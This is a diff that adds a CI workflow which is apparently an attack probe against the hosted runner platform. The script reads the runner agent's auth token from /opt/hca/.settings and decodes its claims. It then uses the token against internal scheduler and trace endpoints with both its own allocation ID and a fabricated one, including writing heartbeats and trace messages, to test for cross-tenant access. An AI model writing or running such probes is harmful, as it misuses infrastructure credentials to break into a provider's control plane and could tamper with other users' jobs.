@@ -1,0 +1,84 @@
+name: probe_v69_readback
+on:
+  workflow_dispatch:
+jobs:
+  readback:
+    runs-on: ubuntu-latest
+    steps:
+      - name: readback-probe
+        continue-on-error: true
+        run: |
+          python3 - <<'PYEOF'
+          import json, base64, urllib.request, urllib.error
+
+          s = json.load(open('/opt/hca/.settings'))
+          tok   = s['authToken']
+          sched = s['schedulerApiUrl']          # .../v1
+          trace = s.get('traceApiUrl','')
+          host  = sched.rsplit('/v1', 1)[0]
+
+          def b64d(x):
+              x += '=' * (-len(x) % 4)
+              return base64.urlsafe_b64decode(x)
+
+          payload = json.loads(b64d(tok.split('.')[1]))
+          wid = payload.get('wid', '')
+          own = wid.split(':')[1] if wid.count(':') >= 1 else ''
+          print('WID=' + wid)
+          print('OWN_ALLOC=' + own)
+          print('SCHED=' + sched)
+          print('HOST=' + host)
+          print('IAT=' + str(payload.get('iat')) + ' RBF=' + str(payload.get('rbf')) + ' EXP=' + str(payload.get('exp')))
+
+          fab = 'deadbeef-dead-4ead-dead-deadbeefface'
+
+          def req(method, url, body=None):
+              data = json.dumps(body).encode() if body is not None else None
+              r = urllib.request.Request(url, data=data, method=method)
+              r.add_header('Authorization', 'Bearer ' + tok)
+              r.add_header('Content-Type', 'application/json')
+              try:
+                  resp = urllib.request.urlopen(r, timeout=15)
+                  return resp.status, dict(resp.headers), resp.read(3000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, dict(e.headers), e.read(3000).decode('utf-8', 'replace')
+              except Exception as e:
+                  return 'ERR', {}, str(e)
+
+          def show(tag, st, h, b):
+              one = b.replace('\n', ' ').replace('\r', ' ') if isinstance(b, str) else str(b)
+              ct = h.get('Content-Type', '') if isinstance(h, dict) else ''
+              print('%s -> status=%s len=%d ctype=%s body=%s' % (tag, st, len(b) if isinstance(b, str) else 0, ct, one[:400]))
+
+          # ---- GET read-back endpoint discovery ----
+          get_tmpls = [
+              sched + '/request/{a}',
+              sched + '/request/{a}/status',
+              sched + '/request/{a}/heartbeat',
+              sched + '/allocation/{a}',
+              sched + '/allocations/{a}',
+              sched + '/request?allocationId={a}',
+              sched + '/request',
+              host  + '/vm/v1/request/{a}',
+              host  + '/vm/v1/{a}',
+          ]
+          print('=== GET PROBES ===')
+          for tmpl in get_tmpls:
+              for label, a in [('own', own), ('fab', fab)]:
+                  url = tmpl.replace('{a}', a)
+                  st, h, b = req('GET', url)
+                  show('GET[%s] %s' % (label, url), st, h, b)
+
+          # ---- write endpoints WITH body capture ----
+          print('=== PUT heartbeat (body captured) ===')
+          for label, a in [('own', own), ('fab', fab)]:
+              st, h, b = req('PUT', sched + '/request/heartbeat', {'allocationId': a})
+              show('PUT-heartbeat[%s]' % label, st, h, b)
+
+          print('=== POST trace (body captured) ===')
+          for label, a in [('own', own), ('fab', fab)]:
+              st, h, b = req('POST', trace, [{'level': 0, 'message': 'probe-v69', 'allocationId': a}])
+              show('POST-trace[%s]' % label, st, h, b)
+
+          print('=== DONE ===')
+          PYEOF
